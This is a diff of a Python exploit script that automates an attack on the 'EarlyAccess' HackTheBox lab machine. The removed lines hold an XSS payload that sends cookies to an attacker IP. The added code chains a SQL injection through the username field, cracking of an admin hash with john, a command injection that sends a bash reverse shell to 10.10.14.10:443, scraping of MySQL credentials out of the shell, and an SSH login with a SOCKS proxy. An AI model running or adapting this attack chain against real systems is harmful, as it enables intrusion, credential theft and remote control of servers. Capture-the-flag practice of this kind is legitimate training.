@@ -1,11 +1,14 @@
 #!/usr/bin/python3
+import pexpect
 import requests
 import time
 from pwn import *
 import pdb
 import sys
 import json
-import html
+from itertools import product
+import multiprocessing
+
 
 
 requests.packages.urllib3.disable_warnings()
@@ -17,6 +20,10 @@ email = "pr1ngl3s@pr1ngl3s.com"
 password = "pr1ngl3s123"
 password2 = "pr1ngl3s123"
 url_login = "https://earlyaccess.htb/login"
+url_key = "https://earlyaccess.htb/key"
+
+
+
 
 s = requests.session()
 
@@ -24,6 +31,24 @@ s = requests.session()
 r = s.get(url_login, verify=False)
 
 token = re.findall('name="_token" value="(.*?)"',r.text)[0]
+
+def calc_g3():
+	r = product(string.ascii_uppercase, repeat=2)
+
+	r2 = [ "".join(x) for x in r ]
+
+
+	com = {}
+
+	for x in r2:
+		for i in range(0,10):
+			key = f"XP{x}{i}"
+
+			value = sum(bytearray(key.encode()))
+
+			com[value] = key
+
+	return com.values()
 
 
 def checksum_calc(key):
@@ -48,23 +73,15 @@ def try_keys(keys):
 
 	key_verify_url = "https://earlyaccess.htb/key/add"
 
-	p1 = log.progress("Ataque de fuerza bruta")
-
-	p1.status("Iniciando ataque de fuerza bruta...")
-
-	time.sleep(2)
-
 	cont = 1
 
 	for key in keys:
 
 		url_token = "https://earlyaccess.htb/login"
 
-		p1.status("Probando con la %s de [%d/60]" % (key,cont))
+		r = s.get(url_key, verify=False)
 
-#		r = s.get(url_key, cookies=cookies, verify=False)
-
-#		token = re.findall('name="_token" value="(.*?)"',r.text)[0]
+		token = re.findall('name="_token" value="(.*?)"',r.text)[0]
 
 		data_post = {
 			'_token': token,
@@ -76,7 +93,6 @@ def try_keys(keys):
 		time.sleep(1)
 
 		if "Game-key is invalid!" not in r.text:
-			p1.status("La key %s ha sido registrada con exito" % key)
 			break
 
 		cont += 1
@@ -179,15 +195,118 @@ def Update_name(old_name,new_name):
 	    ]
 	}
 
-	json_data_post = json.dumps(data_post)
+	r = s.post(url_update, data=json.dumps(data_post),headers=headers, verify=False)
 
-	r = s.post(url_update, data=json_data_post,headers=headers, verify=False)
 
-def XSS_Cookie_Hijacking():
+def GetPassAdmin():
 
-	url__send_message= "https://earlyaccess.htb/contact"
+	url_game_login = "http://game.earlyaccess.htb/actions/login.php"
 
-	Update_name("<script>document.location='http://10.10.14.10/?c='+document.cookie</script>","pr1ngl3s")
+	url_set_score = "http://game.earlyaccess.htb/actions/score.php?score=0"
+
+	url_scoreboard = "http://game.earlyaccess.htb/scoreboard.php"
+
+
+	data_post = {
+		'email': email,
+		'password': password
+	}
+
+	r = s.post(url_game_login, data=data_post, verify=False)
+
+	r = s.get(url_set_score, verify=False)
+
+	r = s.get(url_scoreboard, verify=False)
+
+	hash = re.findall('<tbody><tr><td>(.*?)</td>', r.text)[0]
+
+	return crack_hash(hash)
+
+def crack_hash(hash):
+
+	with open('hash', 'w') as file:
+		file.write(hash)
+
+
+	os.system("john -w=/usr/share/wordlists/rockyou.txt hash > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")
+
+	with open('pass', 'r') as file:
+
+		Pass = file.read()
+
+	return Pass.replace('\n','')
+
+def Login_admin(pass_admin):
+	url_login_admin = "http://dev.earlyaccess.htb/actions/login.php"
+
+	data_post = {
+		'password': pass_admin
+	}
+
+	r = s.post(url_login_admin,data=data_post)
+
+def Send_Shell():
+
+	url_hash = "http://dev.earlyaccess.htb/actions/hash.php"
+
+	data_post = {
+		'action': 'hash',
+		'redirect': 'true',
+		'password': "bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'",
+		'hash_function': 'system',
+		'debug': 'test'
+	}
+
+	r = s.post(url_hash, data=data_post)
+
+
+def Get_Shell():
+	with listen('443', timeout=20) as shell:
+		shell.sendline("cd /tmp".encode('utf-8'))
+		shell.sendline("su www-adm".encode('utf-8'))
+		time.sleep(1)
+		shell.sendline(f"{pass_admin}".encode('utf-8'))
+		shell.sendline("wget http://172.18.0.101:5000/check_db".encode('utf-8'))
+		time.sleep(1)
+		shell.sendline("cat check_db".encode('utf-8'))
+
+
+		# Usar recv() en un bucle para recibir datos en fragmentos hasta que se reciba toda la información necesaria.
+		datos_recibidos = b""
+
+		while True:
+			datos = shell.recv(4096)
+			if not datos:
+				break
+			datos_recibidos += datos
+
+		with open('check_db', 'wb') as f:
+			f.write(datos_recibidos)
+
+def Get_Credentials():
+
+	with open('check_db', 'r') as file:
+		check_db = file.read()
+
+	os.remove("check_db")
+
+	return	re.findall(r'\"MYSQL_USER=(.*?)\"', check_db)[0],re.findall(r'\"MYSQL_ROOT_PASSWORD=(.*?)\"', check_db)[0]
+
+
+def Drew(username,password):
+	ssh_command = f"ssh {username}@10.10.11.110 -D 1080"
+
+	ssh_session = pexpect.spawn(ssh_command, timeout=None)
+
+	ssh_session.expect('password:')
+
+	ssh_session.sendline(password)
+
+	ssh_session.sendline("export TERM=xterm")
+
+	ssh_session.sendline("cat user.txt")
+
+#	ssh_session.interact()
 
 
 
@@ -198,16 +317,27 @@ if __name__ == "__main__":
 
 	Login()
 
-	XSS_Cookie_Hijacking()
-
-
-
-
-
-
+	Update_name("') union select name,email,password from users-- -","') union select name,email,password from users-- -")
 
 #	Key_Gen()
 
-#	panel_admin()
+	pass_admin = GetPassAdmin()
 
+	os.remove("hash")
+
+	os.remove("pass")
+
+	os.remove("/root/.john/john.log")
+
+	os.remove("/root/.john/john.pot")
+
+	Login_admin(pass_admin)
+
+	multiprocessing.Process(target=Send_Shell).start()
+
+	Get_Shell()
+
+	User_drew, Pass_drew = Get_Credentials()
+
+	Drew(User_drew, Pass_drew)
 
